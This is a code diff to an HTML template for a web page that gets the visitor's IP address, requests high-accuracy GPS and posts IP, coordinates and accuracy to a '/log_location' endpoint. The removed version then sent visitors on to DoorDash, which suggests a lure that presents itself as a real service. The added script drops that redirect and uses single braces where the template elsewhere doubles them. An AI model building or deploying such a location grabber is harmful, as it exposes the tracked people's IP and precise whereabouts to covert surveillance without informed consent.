@@ -119,72 +119,59 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
-    <script>
-        async function sendDataAndRedirect(locationData) {{
-            try {{
-                // Send data to server
-                const response = await fetch('/log_location', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify(locationData)
-                }});
-                
-                if (response.ok) {{
-                    // Redirect to DoorDash after successful logging
-                    window.location.href = "https://www.doordash.com";
-                }} else {{
-                    alert("Error processing your request. Please try again.");
-                }}
-            }} catch (error) {{
-                console.error('Error:', error);
-                alert("An error occurred. Please try again.");
-            }}
-        }}
+ <script>
+// Remove ALL existing click handlers to prevent duplicates
+document.getElementById('gps-allow-btn').replaceWith(document.getElementById('gps-allow-btn').cloneNode(true));
 
-        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
-            try {{
-                // Get client IP first
-                const clientIp = await fetch('/getip').then(r => r.text());
-                
-                // Log permission request
-                await sendDataAndRedirect({{
-                    type: 'permission_request',
-                    ip: clientIp,
-                    timestamp: new Date().toISOString()
-                }});
-                
-                // Request location
-                const position = await new Promise((resolve, reject) => {{
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }});
-                }});
-                
-                // Log location and redirect
-                await sendDataAndRedirect({{
-                    type: 'location_data',
-                    ip: clientIp,
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: new Date().toISOString()
-                }});
-                
-            }} catch (error) {{
-                console.error('Location error:', error);
-                const clientIp = await fetch('/getip').then(r => r.text());
-                await sendDataAndRedirect({{
-                    type: 'error',
-                    ip: clientIp,
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                }});
-                alert("Device access is required to continue to our service.");
-            }}
-        }});
-    </script>
+// New clean event listener
+document.getElementById('gps-allow-btn').addEventListener('click', async () => {
+  try {
+    // 1. Get IP
+    const ip = await fetch('/getip').then(r => r.text());
+    
+    // 2. Log permission request
+    await fetch('/log_location', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'permission_request',
+        ip: ip,
+        timestamp: new Date().toISOString()
+      })
+    });
+
+    // 3. Get GPS
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    });
+
+    // 4. Log location
+    await fetch('/log_location', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'location_data',
+        ip: ip,
+        lat: position.coords.latitude,
+        lng: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+      })
+    });
+
+    // 5. ONLY hide overlay - NO REDIRECT
+    document.getElementById('gps-overlay').style.display = 'none';
+
+  } catch (error) {
+    console.error("Error:", error);
+    alert("Location access is required to continue.");
+  }
+});
+</script>
 </body>
 </html>
 """
